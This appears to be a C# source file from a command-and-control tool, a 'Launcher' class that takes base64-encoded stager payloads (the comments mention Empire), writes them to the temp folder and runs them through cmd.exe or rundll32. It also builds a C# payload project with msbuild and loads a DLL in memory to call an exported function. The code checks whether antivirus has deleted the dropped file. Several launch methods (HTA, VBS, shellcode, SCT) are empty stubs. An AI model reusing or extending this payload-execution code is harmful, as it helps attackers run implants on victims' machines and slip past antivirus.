using System;
using System.Linq;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using DynamicDLLLoader;
using System.IO.Compression;

namespace c2interop{
    public class Launcher{
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate void DllMain12();

        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        private string ThreadFilename;
        public Launcher(){

        }

        private void Pause(){
            Console.Write("Pause. Enter any key to continue.");
            Console.ReadLine();
        }

        private byte[] getPayloadBinary(string base64FileData){
            return Convert.FromBase64String(base64FileData);
        }

        private void SaveBinaryToDisk(string filename, byte[] binaryData){
            using (BinaryWriter bwriter = new BinaryWriter(new StreamWriter(filename).BaseStream)){
                bwriter.Write(binaryData);
                bwriter.Close();
            }
        }

        public bool UnZipBuildAndLaunchCSharpProject(string filename, stager s){
            if (s.output == null || s.output == ""){
                Console.WriteLine("[!!] No stager data found to execute.");
                return false;
            }

            //The current payload from empire is a .Net 2 project, probably need to update this to 4.0, but for now blah
            if (!File.Exists(@"c:\Windows\Microsoft.NET\Framework64\v2.0.50727\msbuild.exe")){
                Console.WriteLine("[!!] Host doesn't have msbuild for .Net 2.0");
                return false;
            }

            //This should be done in memory but alas, IDGAF rn
            string zipFileName = Guid.NewGuid().ToString()+".zip";
            string unzipDir = Guid.NewGuid().ToString();

            using (BinaryWriter bw = new BinaryWriter(new StreamWriter(Path.Combine(Path.GetTempPath(),zipFileName)).BaseStream)){
                bw.Write(Convert.FromBase64String(s.output));
            }

            //ZipFile.OpenRead(Path.Combine(Path.GetTempPath(), zipFileName));
            Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), unzipDir));
            ZipFile.ExtractToDirectory(Path.Combine(Path.GetTempPath(), zipFileName),Path.Combine(Path.GetTempPath(),unzipDir));            

            Pause();

            if(runMSBUILD(Path.Combine(Path.GetTempPath(),unzipDir,"cmd"))){
                ThreadFilename = Path.Combine(Path.GetTempPath(),unzipDir,"bin/Debug/cmd.exe");
                Thread t = new Thread(new ThreadStart(StartCMDEXEProcess));
                t.Start();
            }

            Pause();

            return true;    
        }

        public bool runMSBUILD(string PathToProject){
            string[] projectFiles = Directory.GetFiles(PathToProject,"*.csproj");
            if (projectFiles.Count() == 0){
                Console.WriteLine("[!!] Could not find any projects at " + PathToProject);
                return false;
            }

            ThreadFilename = @"c:\Windows\Microsoft.NET\Framework64\v2.0.50727\msbuild.exe " + projectFiles[0];
            StartCMDEXEProcess();

            return true;
        }

        public bool LaunchWindowsProcess(string filename, stager s){
            try{
                if (s.output == null || s.output == ""){
                    Console.WriteLine("[!!] No stager data found to execute.");
                    return false;
                }
                
                ThreadFilename = Path.Combine(Path.GetTempPath(),filename);

                Console.WriteLine("Dropping payload to disk at " +  ThreadFilename);

                SaveBinaryToDisk(ThreadFilename, getPayloadBinary(s.output));

                System.Threading.Thread.Sleep(2000);

                if (!File.Exists(ThreadFilename)){
                    Console.WriteLine("[!!] Could not find binary, AV deleted?");
                    return false;
                }

                
                Thread t = new Thread(new ThreadStart(StartCMDEXEProcess));
                t.Start();
            }
            catch(Exception e){
                Console.Write("[!!] Error starting payload:" + e.Message);
                return false;
            }
            return true;
        }

        private void StartCMDEXEProcess(){
            //For now...
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe","/c " + ThreadFilename);
            psi.UseShellExecute = true;
            Process p = Process.Start(psi);
        }

        private void StartDLLProcess(){
            //For now...
            ProcessStartInfo psi = new ProcessStartInfo("rundll32.exe", ThreadFilename);
            psi.UseShellExecute = true;
            Process p = Process.Start(psi);
        }        

        public bool LaunchHTA(string filename, stager s){
            throw new NotImplementedException();
        }

        public bool LaunchWindowsLink(string filename, stager s){
            throw new NotImplementedException();
        }

        public bool LaunchInMemShellcode(stager s){
            throw new NotImplementedException();
        }

        public bool LaunchVBS(string filename, stager s){
            throw new NotImplementedException();
        }


        public bool LaunchInMemoryDLL(string filename, stager s){
            try{
                if (s.output == null || s.output == ""){
                    Console.WriteLine("[!!] No stager data found to execute.");
                    return false;
                }
                
                byte[] payloadData = getPayloadBinary(s.output);
                DynamicDLLLoader.DynamicDllLoader dllLoader = new DynamicDLLLoader.DynamicDllLoader();
                dllLoader.LoadLibrary(payloadData);
                uint addr = dllLoader.GetProcAddress("VoidFunc");

                DllMain12 invoke = (DllMain12)Marshal.GetDelegateForFunctionPointer((IntPtr)addr, typeof(DllMain12));
                invoke();
                
                //Thread t = new Thread(new ThreadStart(StartDLLProcess));
                //t.Start();
            }
            catch(Exception e){
                Console.Write("[!!] Error starting payload:" + e.Message);
                return false;
            }
            return true;
        }

        public bool LaunchDLL(string filename, stager s){
            try{
                if (s.output == null || s.output == ""){
                    Console.WriteLine("[!!] No stager data found to execute.");
                    return false;
                }
                
                ThreadFilename = Path.Combine(Path.GetTempPath(),filename);

                Console.WriteLine("Dropping payload to disk at " +  ThreadFilename);

                SaveBinaryToDisk(ThreadFilename, getPayloadBinary(s.output));

                System.Threading.Thread.Sleep(2000);

                if (!File.Exists(ThreadFilename)){
                    Console.WriteLine("[!!] Could not find binary, AV deleted?");
                    return false;
                }

                
                Thread t = new Thread(new ThreadStart(StartDLLProcess));
                t.Start();
            }
            catch(Exception e){
                Console.Write("[!!] Error starting payload:" + e.Message);
                return false;
            }
            return true;
        }

        public bool LaunchWindowsSCT(string filename, stager s){
            throw new NotImplementedException();
        }
    }
}
